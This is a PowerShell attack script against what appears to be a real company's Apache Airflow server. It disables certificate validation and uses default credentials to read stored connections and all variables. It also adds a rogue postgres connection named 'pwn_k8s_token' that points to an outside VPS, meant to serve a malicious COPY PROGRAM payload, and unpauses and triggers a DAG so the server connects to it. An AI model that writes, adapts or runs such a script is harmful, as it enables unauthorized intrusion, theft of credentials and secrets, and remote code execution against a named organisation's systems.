Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$base = "https://dev-airflow.kbfinansia.com"
$encoded = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))

function AF-Get($path) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "GET"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $req.Accept = "application/json"
        $resp = $req.GetResponse()
        $r = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR:" + $r.ReadToEnd()
        }
        return "EXC:" + $_.Exception.Message
    }
}

function AF-Post($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "POST"
        $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $r = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR:" + $r.ReadToEnd()
        }
        return "EXC:" + $_.Exception.Message
    }
}

function AF-Patch($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "PATCH"
        $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $r = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR:" + $r.ReadToEnd()
        }
        return "EXC:" + $_.Exception.Message
    }
}

# STRATEGY: Create a postgres connection pointing to our VPS (47.250.155.133:5432)
# When dbdocs db2dbml runs, it will connect to our VPS postgres
# We need to have postgres running on our VPS and capture the connection/credentials
# But actually - dbdocs will TRY to connect and our VPS can respond with arbitrary SQL
# Key insight: dbdocs likely runs an introspection query on the DB
# We can use a malicious postgres server to return a COPY PROGRAM payload

# Step 1: Create malicious connection pointing to VPS
$malConn = '{"connection_id":"pwn_k8s_token","conn_type":"postgres","host":"47.250.155.133","login":"airflow","password":"airflow","port":5432,"schema":"airflow","extra":""}'
Write-Host "=== CREATE VPS CONNECTION ==="
Write-Host (AF-Post "/api/v1/connections" $malConn)

# Step 2: Also create a connection with payload in conn_string that breaks dbdocs parsing
# dbdocs db2dbml postgres "postgresql://user:pass@host/db" -o output
# If we can inject into the connection string: postgresql://user:pass@host/db$(cmd)
# But this goes through build_conn_string which URL-encodes, so no shell injection

# Step 3: Check the confins_r3_foundation connection detail to get extra field
Write-Host "`n=== confins_r3_foundation DETAIL ==="
Write-Host (AF-Get "/api/v1/connections/confins_r3_foundation")

# Step 4: Get confins_r3_asset detail
Write-Host "`n=== confins_r3_asset DETAIL ==="
Write-Host (AF-Get "/api/v1/connections/confins_r3_asset")

# Step 5: Get kubernetes_default (we created this earlier)
Write-Host "`n=== kubernetes_default DETAIL ==="
Write-Host (AF-Get "/api/v1/connections/kubernetes_default")

# Step 6: Get airflow metadata DB connection (if exposed as connection)  
Write-Host "`n=== airflow_db DETAIL ==="
Write-Host (AF-Get "/api/v1/connections/airflow_db")

# Step 7: Get all variables with full values
Write-Host "`n=== ALL VARIABLES ==="
Write-Host (AF-Get "/api/v1/variables?limit=200")

# Step 8: Try to trigger dbdocs with VPS conn_id
# First need to unpause if paused
$unpause = '{"is_paused":false}'
Write-Host "`n=== UNPAUSE dbdocs ==="
Write-Host (AF-Patch "/api/v1/dags/dbdocs_build_dbml_dynamic" $unpause)

# Step 9: Trigger with VPS connection  
$ts = [DateTimeOffset]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")
$triggerBody = "{`"conf`":{`"connection_id`":`"pwn_k8s_token`",`"project_name`":`"pwn_test`",`"project_password`":`"`"},`"logical_date`":`"$ts`"}"
Write-Host "`n=== TRIGGER dbdocs with VPS conn ==="
Write-Host (AF-Post "/api/v1/dags/dbdocs_build_dbml_dynamic/dagRuns" $triggerBody)
